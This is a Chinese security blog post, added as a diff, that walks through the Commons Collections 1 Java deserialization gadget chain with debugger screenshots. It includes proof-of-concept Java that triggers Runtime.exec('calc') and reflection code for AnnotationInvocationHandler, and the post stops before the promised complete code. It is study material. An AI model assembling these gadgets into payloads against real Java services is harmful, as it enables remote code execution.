@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CC1调用链图解  InvokerTransformer类的transform方法首先我们在InvokerTransformer类中传入我们要传入的对象这样我们就可以实现对其控制 我们首先进行调试  我们首先进入InvokerTransformer类中对其进行赋值  我们在向下调试我们传入了获取到的Runtime类的实例，从而在向下调  这个时候调用到了Runtime中的exec方法，传入的iAr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Commons-Collection01">
+<meta property="og:url" content="https://dgxddd.github.io/2025/04/22/Commons-Collection01/">
+<meta property="og:site_name" content="jxdgx">
+<meta property="og:description" content="CC1调用链图解  InvokerTransformer类的transform方法首先我们在InvokerTransformer类中传入我们要传入的对象这样我们就可以实现对其控制 我们首先进行调试  我们首先进入InvokerTransformer类中对其进行赋值  我们在向下调试我们传入了获取到的Runtime类的实例，从而在向下调  这个时候调用到了Runtime中的exec方法，传入的iAr">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010164439054.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010154630321.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010154901367.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010155011240.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010162206902.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010162303185.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010162426119.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010162926782.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010163510657.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010163700581.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010164523418.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010175156491.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010181330619.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010181211616.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010182648627.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010183126844.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010183651513.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010184133747.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011182511596.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011184211392.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010201522640.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011100834502.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011101322722.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011180918498.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011103144051.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011174630289.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011174847134.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011180155719.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011175848362.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011180439595.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011180634578.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011181106041.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011181233761.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011181918236.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011183042768.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011183330476.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011183321442.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011184021589.png">
+<meta property="article:published_time" content="2025-04-22T13:46:20.000Z">
+<meta property="article:modified_time" content="2026-04-22T14:08:29.573Z">
+<meta property="article:author" content="jxdgx">
+<meta property="article:tag" content="CC链">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010164439054.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+        
+      
+    
+    <!-- title -->
+    <title>Commons-Collection01 | jxdgx</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr is-post-page">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2025/07/10/HW%E6%8A%80%E6%88%98%E6%B3%951/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/03/21/java%E5%8F%8D%E5%B0%84/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://dgxddd.github.io/2025/04/22/Commons-Collection01/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://dgxddd.github.io/2025/04/22/Commons-Collection01/&text=Commons-Collection01"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://dgxddd.github.io/2025/04/22/Commons-Collection01/&title=Commons-Collection01"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://dgxddd.github.io/2025/04/22/Commons-Collection01/&is_video=false&description=Commons-Collection01"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Commons-Collection01&body=Check out this article: https://dgxddd.github.io/2025/04/22/Commons-Collection01/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://dgxddd.github.io/2025/04/22/Commons-Collection01/&title=Commons-Collection01"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://dgxddd.github.io/2025/04/22/Commons-Collection01/&title=Commons-Collection01"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://dgxddd.github.io/2025/04/22/Commons-Collection01/&title=Commons-Collection01"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://dgxddd.github.io/2025/04/22/Commons-Collection01/&title=Commons-Collection01"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://dgxddd.github.io/2025/04/22/Commons-Collection01/&name=Commons-Collection01&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://dgxddd.github.io/2025/04/22/Commons-Collection01/&t=Commons-Collection01"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CC1%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">CC1调用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">图解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#InvokerTransformer%E7%B1%BB%E7%9A%84transform%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">InvokerTransformer类的transform方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TransformedMap%E4%B8%AD%E7%9A%84checkSetValue%E6%96%B9%E6%B3%95%E4%B8%AD%E8%B0%83%E7%94%A8%E4%BA%86valueTransformer-transform%EF%BC%88%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">TransformedMap中的checkSetValue方法中调用了valueTransformer.transform（）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MapEntry%E7%B1%BB%E7%9A%84setValue%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E4%BA%86TransformedMap%E7%B1%BB%E4%B8%AD%E7%9A%84checkSetValue%E6%96%B9%E6%B3%95"><span class="toc-number">5.</span> <span class="toc-text">MapEntry类的setValue方法调用了TransformedMap类中的checkSetValue方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E7%B1%BB"><span class="toc-number">6.</span> <span class="toc-text">入口类</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Commons-Collection01
+    </h1>
+
+
+
+    <div class="meta meta-post">
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-22T13:46:20.000Z" class="dt-published" itemprop="datePublished">2025-04-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CC%E9%93%BE/" rel="tag">CC链</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="CC1调用链"><a href="#CC1调用链" class="headerlink" title="CC1调用链"></a>CC1调用链</h2><h2 id="图解"><a href="#图解" class="headerlink" title="图解"></a>图解</h2><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010164439054.png" alt="+" style="zoom: 200%;" />
+
+<h2 id="InvokerTransformer类的transform方法"><a href="#InvokerTransformer类的transform方法" class="headerlink" title="InvokerTransformer类的transform方法"></a>InvokerTransformer类的transform方法</h2><p>首先我们在InvokerTransformer类中传入我们要传入的对象这样我们就可以实现对其控制</p>
+<p>我们首先进行调试</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010154630321.png" alt="image-20231010154630321"></p>
+<p>我们首先进入InvokerTransformer类中对其进行赋值</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010154901367.png" alt="image-20231010154901367"></p>
+<p>我们在向下调试我们传入了获取到的Runtime类的实例，从而在向下调</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010155011240.png" alt="image-20231010155011240"></p>
+<p>这个时候调用到了Runtime中的exec方法，传入的iArgs为calc</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010162206902.png" alt="image-20231010162206902"></p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010162303185.png" alt="image-20231010162303185"></p>
+<p>这个时候我们就可以弹个计算器了</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010162426119.png" alt="image-20231010162426119"></p>
+<h2 id="TransformedMap中的checkSetValue方法中调用了valueTransformer-transform（）"><a href="#TransformedMap中的checkSetValue方法中调用了valueTransformer-transform（）" class="headerlink" title="TransformedMap中的checkSetValue方法中调用了valueTransformer.transform（）"></a>TransformedMap中的checkSetValue方法中调用了valueTransformer.transform（）</h2><p>我们只需要重写valueTransformer为InvokerTransformer这样我们就可以进行调用</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010162926782.png" alt="image-20231010162926782"></p>
+<p>我们在上面的decorate方法中看到了实体化了TransformedMap</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010163510657.png" alt="image-20231010163510657"></p>
+<p>TransformedMap中然后对valueTransformer进行了赋值、</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010163700581.png" alt="image-20231010163700581"></p>
+<p>我们只需要对decorate中的参数进行赋值就可以调用到了valueTransformer.transform（）</p>
+<h2 id="MapEntry类的setValue方法调用了TransformedMap类中的checkSetValue方法"><a href="#MapEntry类的setValue方法调用了TransformedMap类中的checkSetValue方法" class="headerlink" title="MapEntry类的setValue方法调用了TransformedMap类中的checkSetValue方法"></a>MapEntry类的setValue方法调用了TransformedMap类中的checkSetValue方法</h2><p>然后我们ctrl+左键查看是谁调用了checkSetValue方法这个只有这一处</p>
+<p>我们就发现了MapEntry类的setValue方法调用了checkSetValue方法</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010164523418.png" alt="image-20231010164523418"></p>
+<p>1.这个时候我们可以看出这个传参的值是传入了valueTransformer.transform(value);进而调用了，这个时候我们还是要将传参的值为Runtime类的实例</p>
+<p>2.而parent这个值我们要为TransformedMap这样的话，就可以调用TransformedMap类中的checkSetValue方法</p>
+<p>3.还要更改TransformedMap类中valueTransformer的值为InvokerTransformer这样的话就可以满足调用了</p>
+<p>我们可以知道Entry代表map中的一个键值对，我们举个例子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Map&lt;String, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;one&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        map.put(<span class="string">&quot;two&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Integer&gt; entry : map.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="type">Integer</span> <span class="variable">value</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">            System.out.println(<span class="string">&quot;Key: &quot;</span> + key + <span class="string">&quot;, Value: &quot;</span> + value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到entry为键值对</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010175156491.png" alt="image-20231010175156491"></p>
+<p>而MapEntry中有一个父类AbstractMapEntryDecorator，而AbstractMapEntryDecorator类实现了Map.Entry这个接口。我们发现AbstractMapEntryDecorator类中有</p>
+<p>setValue方法。</p>
+<p>我们发现mapEntry类重写了AbstractMapEntryDecorator类中的setValue方法。</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010181330619.png" alt="image-20231010181330619"></p>
+<p>我们可以通过对Map的遍历触发setValue方法这样就可以更新值，我们去实体化一个map，来put值从而来对这进行遍历。</p>
+<p>我们通过TransformedMap的decorate方法进行封装从而来进行遍历</p>
+<p>我们首先更改TransformedMap类中valueTransformer的值为InvokerTransformer</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010181211616.png" alt="image-20231010181211616"></p>
+<p>然后通过遍历的时候会调用setValue方法</p>
+<p>测试例子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;jxdgx&quot;</span>, <span class="string">&quot;jxdgx&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        System.out.println(transformedmap);</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry : transformedmap.entrySet()) &#123;</span><br><span class="line">            entry.setValue(runtime);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们通过来调试跟一下</p>
+<p>这个时候我们可以看到valueTransformer赋值为了InvokerTransformer对象，这个时候我们完成了第一步</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010182648627.png" alt="image-20231010182648627"></p>
+<p>然后在跟下去这个时候我们可以看到parent这个值为TransformedMap对象，个数为1，这个时候我们完成了第二步</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010183126844.png" alt="image-20231010183126844"></p>
+<p>我们返回了AbstractInputCheckedMapDecorator对象，这个时候entry为AbstractInputCheckedMapDecorator的抽象类</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010183651513.png" alt="image-20231010183651513"></p>
+<p>最后我们在调用了MapEntry类中的setValue方法，因为parent为TransformedMap类的对象这个时候我们正好和前面连接起来，且value为Runtime对象这个时候我们就和上面来连接起来了完成了弹计算机</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010184133747.png" alt="image-20231010184133747"></p>
+<h2 id="入口类"><a href="#入口类" class="headerlink" title="入口类"></a>入口类</h2><p>我们还要将命令镶套到InvokerTransformer类中 在Commons Collections库中存在ChainedTransformer这么一个类，它可以将其多个InvokerTransformer类构成一个链进行调用</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011182511596.png" alt="image-20231011182511596"></p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011184211392.png" alt="image-20231011184211392"></p>
+<p>这个时候我们就找一个readobject方法中在调用setvalue就可以完成调用链了（因为readobject会在反序列化的时候调用）</p>
+<p>我们在AnnotationInvocationHandler类中找到了readobject方法中在调用setvalue（）</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010201522640.png" alt="image-20231010201522640"></p>
+<p>我们首先要获取这个类然后通过遍历从而调用，我们发现AnnotationInvocationHandler类不是公共类</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011100834502.png" alt="image-20231011100834502"></p>
+<p>我们首先要获取这个类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">       Constructor annotation = c.getDeclaredConstructor(Class.class,Map.class);//构造器</span><br><span class="line">       annotation.setAccessible(true);</span><br><span class="line">       Object o = annotation.newInstance(Override.class,transformedmap);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011101322722.png" alt="image-20231011101322722"></p>
+<p>这个中我们要传入两个参数分别为</p>
+<ol>
+<li><code>Class&lt;? extends Annotation&gt; type</code>：这是一个参数，它表示一个类类型，该类类型必须是注解类型的子类型。这个参数通常用于指定要操作的注解类型。</li>
+<li><code>Map&lt;String, Object&gt; memberValues</code>：这是另一个参数，它表示一个键值对的映射，其中键是字符串，值是对象。这个参数通常用于存储和传递注解成员的名称和值。</li>
+</ol>
+<p>这个时候我们还有问题没有解决一个是Runtime runtime &#x3D; Runtime.getRuntime();不可以序列化</p>
+<p>还有就是if判断如何过</p>
+<p>这个传参如何解决</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011180918498.png" alt="image-20231011180918498"></p>
+<p>首先第一个问题我们可以通过构造Runtime的class对象来实现因为这个是可以序列化的我们跟进看一下</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011103144051.png" alt="image-20231011103144051"></p>
+<p>我们可以看到这个是可以的，我们分析第一个if如何绕过</p>
+<p>首先我们调试一下，其中我们可以看到Type这个传参是通过我们定义的注解传入的</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011174630289.png" alt="image-20231011174630289"></p>
+<p>我们还可以知道memberValues为TransformedMap对象因为我们传入的为这个<img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011174847134.png" alt="image-20231011174847134"></p>
+<p>这个memTybe我们获得了注解对象Override的键值对的名字value，因为在Override对象中没有这个方法所以我们为null，我们只需用</p>
+<p>Target注解这个时候我们就可以来对其进行绕过因为在在这个对象中含有value方法</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011180155719.png" alt="image-20231011180155719"></p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011175848362.png" alt="image-20231011175848362"></p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011180439595.png" alt="image-20231011180439595"></p>
+<p>现在过了第一个if</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011180634578.png" alt="image-20231011180634578"></p>
+<p>下面我们解决传参问题这个传参是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">    value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">        annotationType.members().get(name)));</span><br></pre></td></tr></table></figure>
+
+<p>这个显然不是我们想要的</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011181106041.png" alt="image-20231011181106041"></p>
+<p>我们想要的是在这里传入 InvokerTransformer类</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011181233761.png" alt="image-20231011181233761"></p>
+<p>这个时候我们找到了ConstantTransformer类</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011181918236.png" alt="image-20231011181918236"></p>
+<p>首先我们可以看到我们这个类是可控的就是无论我们输入什么只要调用ConstantTransformer.transform()方法其结果都是可控的</p>
+<p>在Transformer数组里实例化ConstantTransformer类，我们调试一下</p>
+<p>这个时候我们发现valueTransformer已经赋值为chainedTransformer对象</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011183042768.png" alt="image-20231011183042768"></p>
+<p>我们继续调用我们发现调用了ChainedTransformerr类的transform（）方法传入的值为这些对象中的值</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011183330476.png" alt="image-20231011183330476"></p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011183321442.png" alt="image-20231011183321442"></p>
+<p>最后赋值为第一个数组的值就是ConstantTransformer对象传参为Runtime.class，这个时候我们可以看到返回的值为java.lang.Runtime</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231011184021589.png" alt="image-20231011184021589"></p>
+<p>我们给出完整代码</p>
